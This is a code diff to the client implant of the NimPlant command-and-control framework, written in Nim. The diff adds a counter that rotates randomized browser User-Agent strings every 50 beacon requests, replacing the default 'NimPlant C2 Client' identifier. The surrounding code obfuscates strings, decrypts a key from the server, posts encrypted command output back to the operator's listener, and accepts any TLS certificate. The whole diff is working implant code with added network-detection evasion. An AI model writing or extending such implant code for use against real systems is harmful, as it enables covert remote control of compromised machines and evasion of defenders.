@@ -26,31 +26,40 @@ type
         userAgent* : string
         cryptKey* : string
         randomUserAgents: bool
+        randomUserAgentsCounter: int
+
 
 
 # we can define whether we want to use the randomized userAgents
 # initally its false, unless we specify otherwise in the complie command 
 
 # define a function to pick random userAgents with each command
-proc getRandomUserAgent(): string =
-    let userAgents: seq[string] = @[
-      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-      "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
-      "Android/11 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
-      "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
-      "Linux/x86_64 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-      "SamsungBrowser/15.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Mobile Safari/537.36",
-    ]
+proc getRandomUserAgent(li :var Listener): string =
+    # check if our counter is equal 50, if so we return a NEW random userAgent, otherwise we just return the current one
+    if li.randomUserAgentsCounter == 50 or li.userAgent == "NimPlant C2 Client":
+        let userAgents: seq[string] = @[
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+            "Android/11 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+            "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
+            "Linux/x86_64 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "SamsungBrowser/15.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Mobile Safari/537.36",
+            ]
 
-    # we need to call this, in order to get a random number each time
-    randomize()  
-    let randomIndex = rand(userAgents.high)
+        # we need to call this, in order to get a random number each time
+        randomize()  
+        let randomIndex = rand(userAgents.high)
+        let randomUserAgent = userAgents[randomIndex]
+        li.randomUserAgentsCounter = 0 
+        li.userAgent = userAgents[randomIndex]
 
-    return userAgents[randomIndex]
+    return li.userAgent
 
 # HTTP request function
-proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "") : Response =
+proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
+        # increase the requests counter
+        li.randomUserAgentsCounter += 1 
         # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
         var target : string = toLowerAscii(li.listenerType) & "://"
         if li.listenerHost != "":
@@ -68,7 +77,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 if li.randomUserAgents:
                     headers = @[
                             Header(key: "X-Identifier", value: li.id),
-                            Header(key: "User-Agent", value: getRandomUserAgent())
+                            Header(key: "User-Agent", value: getRandomUserAgent(li))
                         ]
                 else:
                     headers = @[
@@ -79,7 +88,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
             else:
                 if li.randomUserAgents:
                     headers = @[
-                            Header(key: "User-Agent", value: getRandomUserAgent())
+                            Header(key: "User-Agent", value: getRandomUserAgent(li))
                         ]
                 else:
                     headers = @[
@@ -103,7 +112,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 verb: "post",
                 headers: @[
                     Header(key: "X-Identifier", value: li.id),
-                    Header(key: "User-Agent", value: getRandomUserAgent()),
+                    Header(key: "User-Agent", value: getRandomUserAgent(li)),
                     Header(key: "Content-Type", value: "application/json")
                     ],
                 allowAnyHttpsCertificate: true,
@@ -145,6 +154,7 @@ proc init*(li: var Listener) : void =
         li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
         li.initialized = true
         li.randomUserAgents = false
+        li.randomUserAgentsCounter = 0
     else:
         li.initialized = false
 
@@ -216,11 +226,11 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
     result = (cmdGuid, cmd, args)
 
 # Return command results via POST request to the result path
-proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
+proc postCommandResults*(li : var Listener, cmdGuid : string, output : string) : void =
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
     discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey))
 
 # Announce that the kill timer has expired
-proc killSelf*(li : Listener) : void =
+proc killSelf*(li : var Listener) : void =
     if li.initialized:
         postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
